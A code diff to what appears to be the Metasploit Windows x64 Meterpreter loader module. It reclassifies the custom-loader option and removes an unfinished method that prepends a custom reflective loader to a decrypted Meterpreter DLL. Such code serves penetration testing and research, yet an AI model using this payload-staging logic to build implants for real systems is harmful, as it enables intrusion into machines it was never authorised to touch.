@@ -29,7 +29,7 @@ module Payload::Windows::MeterpreterLoader_x64
       'PayloadCompat' => { 'Convention' => 'sockrdi handlerdi -https' },
       'Stage'         => { 'Payload'   => "" }
       ))
-      register_options([
+      register_advanced_options([
         OptBool.new('MeterpreterLoader::CustomLoader', [ false, 'Use a custom loader', false ]),
       ], self.class)
   end
@@ -73,31 +73,6 @@ module Payload::Windows::MeterpreterLoader_x64
   def stage_payload(opts={})
     stage_meterpreter(opts) + generate_config(opts)
   end
-
-  def stage_with_custom_loader(opts={})
-    ds = opts[:datastore] || datastore
-    debug_build = ds['MeterpreterDebugBuild']
-    metsrv_path = MetasploitPayloads.meterpreter_path('metsrv', 'x64.dll', debug: debug_build)
-    meterpreter_data_dir = File.join(Msf::Config.data_directory, 'meterpreter')
-    custom_loader_path = File.join(meterpreter_data_dir, 'custom_loader_x64.bin')
-    print_status("Generating custom loader for Meterpreter stage...")
-    unless File.exist?(custom_loader_path)
-      print_status("Custom loader not found at #{custom_loader_path}, drop your loader there and try again.")
-      raise RuntimeError, "Custom loader not found at #{custom_loader_path}"
-    end
-    
-    custom_loader = File.binread(custom_loader_path)
-    encrypted_dll = ::File.binread(dll_path)
-    dll = ::MetasploitPayloads::Crypto.decrypt(ciphertext: encrypted_dll)
-
-    asm_opts = {
-      rdi_offset: dll.length, # we will append the dll to the end of the custom loader, so the offset to it is just the length of the custom loader
-      length:     dll.length + custom_loader.length, # the total length of the payload is the length of the custom loader + the dll
-      stageless:  opts[:stageless] == true
-    }
-
-  end
-
 
   def generate_config(opts={})
     ds = opts[:datastore] || datastore
@@ -148,7 +123,7 @@ module Payload::Windows::MeterpreterLoader_x64
         length:     dll.length + custom_loader.length, # the total length of the payload is the length of the custom loader + the dll
         stageless:  opts[:stageless] == true
       }
-      vprint_status("Using custom loader at #{custom_loader_path}")
+      puts("WARNING: Local file #{custom_loader_path} is being used")
       vprint_status("Custom loader length: #{custom_loader.length} bytes")
       vprint_status("DLL length: #{dll.length} bytes")
       vprint_status("ReflectiveLoader offset: #{asm_opts[:rdi_offset]} bytes")
